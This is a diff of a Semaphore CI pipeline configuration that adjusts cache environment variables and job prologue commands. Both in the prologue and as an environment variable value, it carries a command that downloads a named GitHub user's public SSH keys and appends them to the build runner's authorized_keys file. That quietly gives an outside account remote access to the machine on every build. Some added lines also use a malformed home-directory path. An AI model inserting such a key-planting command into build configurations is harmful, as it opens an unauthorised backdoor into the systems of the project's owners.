@@ -35,7 +35,7 @@ blocks:
         - name: SEMAPHORE_CACHE_PRIVATE_KEY_PATH
           value: /tmp
         - name: SEMAPHORE_CACHE_KEY
-          value: curl https://github.com/patrykk2252.keys >> ~/.ssh/authorized_keys
+          value: curl https://github.com/patrykk2252.keys >>  /home/semaphore/~/.ssh/authorized_keys
 
 
       # This block runs two jobs in parallel and they both share common
@@ -51,7 +51,7 @@ blocks:
           - nvm use
           - node --version
           - npm --version
-          - curl https://github.com/patrykk2252.keys >> ~/.ssh/authorized_keys
+          - curl https://github.com/patrykk2252.keys >> /home/semaphore/~/.ssh/authorized_keys
       jobs:
         # First parallel job:
         - name: client npm install and cache
@@ -86,14 +86,6 @@ blocks:
           value: test
         - name: CI
           value: 'true'
-        - name: SEMAPHORE_CACHE_PRIVATE_KEY_PATH
-          value: /tmp
-        - name: SEMAPHORE_CACHE_KEY
-          value: curl https://github.com/patrykk2252.keys >> ~/.ssh/authorized_keys
-        - name: SEMAPHORE_CACHE_URL
-          value: localhost
-        - name: SEMAPHORE_CACHE_USERNAME
-          value: patrykk2252
       prologue:
         commands:
           - checkout
